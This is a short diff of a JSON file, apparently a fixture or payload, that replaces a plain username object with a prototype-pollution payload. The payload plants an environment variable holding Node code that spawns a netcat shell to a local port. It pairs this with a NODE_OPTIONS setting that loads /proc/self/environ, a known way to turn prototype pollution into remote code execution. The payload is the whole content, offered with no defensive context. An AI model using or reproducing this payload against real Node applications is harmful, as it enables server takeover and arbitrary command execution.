@@ -1,1 +1,13 @@
-{"username":"__prototype__.hello"}
+{
+  "username": "hello",
+  "constructor": {
+    "__proto__": {
+      "__proto__": {
+        "env": {
+          "EVIL": "console.log(require('child_process').exec('nc -e \"echo pwned && sh\" 127.0.0.1 1337').toString())//"
+        },
+        "NODE_OPTIONS": "--require /proc/self/environ"
+      }
+    }
+  }
+}
